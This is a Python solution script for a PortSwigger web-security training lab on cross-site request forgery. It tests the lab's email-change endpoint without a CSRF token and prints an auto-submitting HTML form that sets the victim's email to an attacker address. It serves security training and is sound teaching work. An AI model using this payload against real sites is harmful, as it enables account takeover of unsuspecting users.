# Lab 01 — CSRF vulnerability with no defences
# PortSwigger: https://portswigger.net/web-security/csrf/lab-no-defenses
#
# Vulnerability: /my-account/change-email — no CSRF token, no SameSite, no Referer check
# Aim:           Change the victim's email address
#
# Technique:
#   The endpoint accepts a POST with just email= and no other validation.
#   The browser automatically attaches the victim's session cookie.
#   A simple auto-submitting HTML form hosted on any domain works.
#
#   This script does two things:
#     1. Verifies the vulnerability by changing your OWN email (as wiener)
#        without supplying a CSRF token — proving the server doesn't require one
#     2. Prints the exploit HTML for delivery via the exploit server
#
# Usage: python csrf_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        get_csrf_from_response, get_account_page,
                        change_email, check_email_changed,
                        print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEST_EMAIL   = "wiener-changed@evil.com"
VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 01 — CSRF: NO DEFENCES")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: log in as wiener and confirm no CSRF token is required ──────
    print("  ── Step 1: verify the endpoint accepts requests with no CSRF token\n")
    if not login(session, url):
        sys.exit(1)

    # Fetch account page — check whether a csrf token even exists in the form
    r = get_account_page(session, url)
    token = get_csrf_from_response(r.text)
    if token:
        print(f"  ℹ  CSRF token found in form: {token[:16]}...")
        print(f"  ➜  Sending request WITHOUT the token to test validation...\n")
    else:
        print("  ✔  No CSRF token in the form at all — endpoint is unprotected\n")

    # Send the email change with NO csrf token
    r2 = change_email(session, url, TEST_EMAIL, csrf_token=None)
    check_email_changed(r2.text, TEST_EMAIL)

    # ── Step 2: print the exploit for victim delivery ────────────────────────
    section("Step 2: Exploit HTML for the exploit server")

    exploit = f"""\
<form method="POST" action="{url}/my-account/change-email">
    <input type="hidden" name="email" value="{VICTIM_EMAIL}">
</form>
<script>document.forms[0].submit();</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  document.forms[0].submit() fires on page load — victim needs")
    print("     no interaction beyond visiting the exploit URL.")
